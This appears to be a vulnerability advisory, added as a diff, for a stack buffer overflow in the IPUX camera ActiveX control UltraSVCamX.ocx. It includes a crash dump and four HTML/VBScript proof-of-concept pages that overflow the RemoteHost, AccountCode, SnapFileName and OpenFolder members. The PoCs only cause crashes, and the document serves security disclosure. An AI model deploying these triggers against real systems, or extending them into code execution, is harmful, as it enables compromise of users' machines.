@@ -1,0 +1,175 @@
+IPUX CL5452/CL5132 IP Camera (UltraSVCamX.ocx) ActiveX Stack Buffer Overflow
+
+
+Vendor: Big Good Holdings Limited | Fitivision Technology Inc.
+Product web page: http://www.ipux.net | http://www.fitivision.com
+Affected version: Bullet Type ICL5132 (firmware: ICL5132 2.0.0-2 20130730 r1112)
+                  Bullet Type ICL5452
+
+Summary: The device is H.264 Wired/Wireless IP Camera with 1.3 Mega-pixel sensor.
+With high performance H.264 video compression, the file size of video stream is
+extremely reduced, as to optimize the network bandwidth efficiency. It has full
+Pan/Tilt function and 3X digital zoom feature for a larger space monitoring. The
+built-in USB port provides a convenient and portable storage option for local storage
+of event and schedule recording, especially network disconnected.
+
+Desc: The UltraSVCam ActiveX Control 'UltraSVCamX.ocx' suffers from a stack buffer
+overflow vulnerability when parsing large amount of bytes to several functions in
+UltraSVCamLib, resulting in memory corruption overwriting several registers including
+the SEH. An attacker can gain access to the system of the affected node and execute
+arbitrary code.
+
+----------------------------------------------------------------------------------
+
+(3ef0.3e0c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\Downloaded Program Files\UltraSVCamX.ocx - 
+eax=41414149 ebx=00000001 ecx=00003e0c edx=02163f74 esi=41414141 edi=02163f74
+eip=77e8466c esp=003eef8c ebp=003eefc0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+ntdll!RtlDeleteCriticalSection+0x77:
+77e8466c 833800          cmp     dword ptr [eax],0    ds:002b:41414149=????????
+
+----------------------------------------------------------------------------------
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN)
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+
+
+Advisory ID: ZSL-2014-5213
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5213.php
+
+
+16.11.2014
+
+---
+
+
+Properties:
+-----------
+
+FileDescription		UltraSVCam ActiveX Control
+FileVersion		1, 0, 53, 34 and 1, 0, 53, 33
+InternalName		UltraSVCamX
+OriginalFileName	UltraSVCamX.ocx
+ProductName		UltraSVCam device ActiveX Control
+ProductVersion		1, 0, 53, 34 and 1, 0, 53, 33
+
+
+List of members:
+----------------
+
+Interface IUltraSVCamX : IDispatch
+Default Interface: True
+Members : 51
+	RemoteHost
+	RemotePort
+	AccountCode
+	Password
+	UserName
+	fChgImageSize
+	ImgWidth
+	ImgHeight
+	SnapFileName
+	AVIRecStart
+	SetImgScale
+	OpenFolder
+	OpenFileDlg
+	TriggerStatus
+	AVIRecStatus
+	PlayVideo
+	SetAutoScale
+	SetPTUserAllow
+	SetLanguage
+	SetFullScreen
+	SetZoom
+	SetDirectShow
+	SetROIParam
+	FOpen
+	FSeek
+	FDeleteFile
+
+
+Vulnerable members of the class:
+--------------------------------
+
+RemoteHost
+AccountCode
+SnapFileName
+OpenFolder
+
+
+PoC(s):
+-------
+
+
+---1
+
+
+<html>
+<object classid='clsid:33AD836E-B04E-4114-B39F-AB77AAA08487' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Windows\Downloaded Program Files\UltraSVCamX.ocx"
+prototype  = "Property Let RemoteHost As String"
+memberName = "RemoteHost"
+progid     = "UltraSVCamLib.UltraSVCamX"
+argCount   = 1
+arg1=String(11284, "A")
+target.RemoteHost = arg1
+</script>
+</html>
+
+
+---2
+
+
+<html>
+<object classid='clsid:33AD836E-B04E-4114-B39F-AB77AAA08487' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Windows\Downloaded Program Files\UltraSVCamX.ocx"
+prototype  = "Property Let AccountCode As String"
+memberName = "AccountCode"
+progid     = "UltraSVCamLib.UltraSVCamX"
+argCount   = 1
+arg1=String(1044, "A")
+target.AccountCode = arg1
+</script>
+</html>
+
+
+---3
+
+
+<html>
+<object classid='clsid:33AD836E-B04E-4114-B39F-AB77AAA08487' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Windows\Downloaded Program Files\UltraSVCamX.ocx"
+prototype  = "Property Let SnapFileName As String"
+memberName = "SnapFileName"
+progid     = "UltraSVCamLib.UltraSVCamX"
+argCount   = 1
+arg1=String(11284, "A")
+target.SnapFileName = arg1
+</script>
+</html>
+
+
+---4
+
+
+<html>
+<object classid='clsid:33AD836E-B04E-4114-B39F-AB77AAA08487' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Windows\Downloaded Program Files\UltraSVCamX.ocx"
+prototype  = "Function OpenFolder ( ByVal sInitPath As String ) As String"
+memberName = "OpenFolder"
+progid     = "UltraSVCamLib.UltraSVCamX"
+argCount   = 1
+arg1=String(2068, "A")
+target.OpenFolder arg1 
+</script>
+</html>
